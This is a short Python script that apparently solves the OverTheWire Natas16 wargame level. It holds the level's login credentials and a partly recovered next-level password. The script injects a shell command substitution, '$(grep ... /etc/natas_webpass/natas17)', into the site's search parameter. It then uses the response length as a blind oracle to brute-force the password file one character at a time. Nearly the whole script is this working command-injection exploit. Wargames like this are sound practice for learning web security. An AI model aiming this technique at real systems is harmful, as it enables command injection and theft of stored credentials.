import requests
from string import ascii_lowercase, ascii_uppercase
import sys
from time import sleep

s=requests.Session()
auth=('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
url='http://natas16.natas.labs.overthewire.org/index.php'
LEN=1105

def confirm(query,s):
    r=s.get(url,params={'needle':query},auth=auth)
    # if we guessed part of password, password would show up as argument for the server's grep, which is for sure not in the dictionary
    return len(r.text)==LEN

known, possible='8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c', '0123456789' + ascii_lowercase + ascii_uppercase
while len(known)<32:
    sleep(10)
    for p in possible:
        trial = known + p
        query = f'$(grep -E ^{trial}.* /etc/natas_webpass/natas17)'
        print(f'len: {len(known)} trying: {trial}\r',end='')
        if confirm(query, s):
            known = trial
            break

print(f'\npassword: {known}')
